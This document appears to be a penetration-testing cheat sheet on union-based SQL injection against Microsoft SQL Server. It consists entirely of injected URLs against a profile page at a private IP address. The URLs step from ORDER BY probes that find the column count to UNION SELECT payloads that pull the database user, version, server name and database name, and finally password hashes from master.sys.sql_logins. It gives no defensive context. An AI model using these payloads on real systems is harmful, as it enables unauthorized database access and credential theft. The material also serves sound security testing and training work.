### SQL Server Union-Based SQL Injection
```

https://192.168.100.1/profile.aspx?id=2 order by 100--
https://192.168.100.1/profile.aspx?id=2 order by 50--
https://192.168.100.1/profile.aspx?id=2 order by 25--
https://192.168.100.1/profile.aspx?id=2 order by 10--
https://192.168.100.1/profile.aspx?id=2 order by 5--
https://192.168.100.1/profile.aspx?id=2 order by 6--
https://192.168.100.1/profile.aspx?id=2 order by 7--
https://192.168.100.1/profile.aspx?id=2 order by 8--
https://192.168.100.1/profile.aspx?id=2 order by 9--
https://192.168.100.1/profile.aspx?id=-2 union all select 1,2,3,4,5,6,7,8,9--

https://192.168.100.1/profile.aspx?id=-2 union all select 1,user,@@version,4,5,6,7,8,9--
https://192.168.100.1/profile.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,7,8,9--
https://192.168.100.1/profile.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,db_name(0),8,9--
https://192.168.100.1/profile.aspx?id=-2 union all select 1,user,@@version,@@servername,5,6,master.sys.fn_varbintohexstr(password_hash),8,9 from master.sys.sql_logins--

```
